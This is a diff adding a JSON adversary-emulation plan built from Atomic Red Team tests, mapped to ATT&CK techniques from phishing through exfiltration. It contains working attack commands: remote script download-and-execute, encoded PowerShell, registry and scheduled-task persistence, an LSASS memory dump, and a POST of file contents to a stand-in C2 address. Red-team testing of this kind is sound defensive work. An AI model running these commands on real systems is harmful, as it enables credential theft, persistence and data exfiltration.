@@ -1,0 +1,153 @@
+{
+  "source": "https://github.com/redcanaryco/atomic-red-team",
+  "commit": "a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6",
+  "license": "MIT (Red Canary)",
+  "plan": "EP-2026-01",
+  "tests": [
+    {
+      "step": 1,
+      "plan_technique": "T1566.001",
+      "tactic": "initial-access",
+      "atomic_technique": "T1566.001",
+      "test_number": 1,
+      "guid": "114ccff9-ae6d-4547-9ead-4cd69f687306",
+      "name": "Download Macro-Enabled Phishing Attachment",
+      "executor": "powershell",
+      "elevation_required": false,
+      "input_arguments": {},
+      "command": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm -UseBasicParsing",
+      "cleanup_command": "Remove-Item $env:TEMP\\PhishingAttachment.xlsm -ErrorAction Ignore"
+    },
+    {
+      "step": 2,
+      "plan_technique": "T1204.002",
+      "tactic": "execution",
+      "atomic_technique": "T1566.001",
+      "test_number": 2,
+      "guid": "cbb6799a-425c-4f83-9194-5447a909d67f",
+      "name": "Word spawned a command shell and used an IP address in the command line",
+      "executor": "powershell",
+      "elevation_required": false,
+      "input_arguments": {
+        "jse_path": "C:\\Users\\Public\\art.jse",
+        "ms_product": "Word"
+      },
+      "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"",
+      "cleanup_command": "Remove-Item #{jse_path} -ErrorAction Ignore"
+    },
+    {
+      "step": 3,
+      "plan_technique": "T1059.001",
+      "tactic": "execution",
+      "atomic_technique": "T1059.001",
+      "test_number": 17,
+      "guid": "a538de64-1c74-46ed-aa60-b995ed302598",
+      "name": "PowerShell Command Execution",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "input_arguments": {
+        "obfuscated_code": "JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA=="
+      },
+      "command": "powershell.exe -e  #{obfuscated_code}",
+      "cleanup_command": ""
+    },
+    {
+      "step": 4,
+      "plan_technique": "T1105",
+      "tactic": "command-and-control",
+      "atomic_technique": "T1105",
+      "test_number": 7,
+      "guid": "dd3b61dd-7bbc-48cd-ab51-49ad1a776df0",
+      "name": "certutil download (urlcache)",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "input_arguments": {
+        "remote_file": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt",
+        "local_path": "Atomic-license.txt"
+      },
+      "command": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}",
+      "cleanup_command": "del #{local_path} >nul 2>&1"
+    },
+    {
+      "step": 5,
+      "plan_technique": "T1547.001",
+      "tactic": "persistence",
+      "atomic_technique": "T1547.001",
+      "test_number": 1,
+      "guid": "e55be3fd-3521-4610-9d1a-e210e42dcf05",
+      "name": "Reg Key Run",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "input_arguments": {
+        "command_to_execute": "C:\\Path\\AtomicRedTeam.exe"
+      },
+      "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"",
+      "cleanup_command": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1"
+    },
+    {
+      "step": 6,
+      "plan_technique": "T1053.005",
+      "tactic": "persistence",
+      "atomic_technique": "T1053.005",
+      "test_number": 2,
+      "guid": "42f53695-ad4a-4546-abb6-7d837f644a71",
+      "name": "Scheduled task Local",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "input_arguments": {
+        "task_command": "C:\\windows\\system32\\cmd.exe",
+        "time": "20:10"
+      },
+      "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}",
+      "cleanup_command": "SCHTASKS /Delete /TN spawn /F >nul 2>&1"
+    },
+    {
+      "step": 7,
+      "plan_technique": "T1003.001",
+      "tactic": "credential-access",
+      "atomic_technique": "T1003.001",
+      "test_number": 2,
+      "guid": "2536dee2-12fb-459a-8c37-971844fa73be",
+      "name": "Dump LSASS.exe Memory using comsvcs.dll",
+      "executor": "powershell",
+      "elevation_required": true,
+      "input_arguments": {},
+      "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full",
+      "cleanup_command": "Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore"
+    },
+    {
+      "step": 8,
+      "plan_technique": "T1560.001",
+      "tactic": "collection",
+      "atomic_technique": "T1560.001",
+      "test_number": 4,
+      "guid": "d1334303-59cb-4a03-8313-b3e24d02c198",
+      "name": "Compress Data and lock with password for Exfiltration with 7zip",
+      "executor": "command_prompt",
+      "elevation_required": false,
+      "input_arguments": {
+        "7zip_installer": "%TEMP%\\7zip.exe",
+        "7zip_exe": "%ProgramFiles%\\7-zip\\7z.exe"
+      },
+      "command": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files\ncd $PathToAtomicsFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{7zip_exe}\" u archive.7z *txt -pblue\ndir",
+      "cleanup_command": "rmdir /s /Q $PathToAtomicsFolder\\T1560.001\\victim-files >nul 2>&1"
+    },
+    {
+      "step": 9,
+      "plan_technique": "T1041",
+      "tactic": "exfiltration",
+      "atomic_technique": "T1041",
+      "test_number": 1,
+      "guid": "d1253f6e-c29b-49dc-b466-2147a6191932",
+      "name": "C2 Data Exfiltration",
+      "executor": "powershell",
+      "elevation_required": false,
+      "input_arguments": {
+        "destination_url": "http://198.51.100.25:8080/upload",
+        "filepath": "$env:TEMP\\LineNumbers.txt"
+      },
+      "command": "if(-not (Test-Path #{filepath})){ \n  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path #{filepath}\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive -UseBasicParsing",
+      "cleanup_command": ""
+    }
+  ]
+}
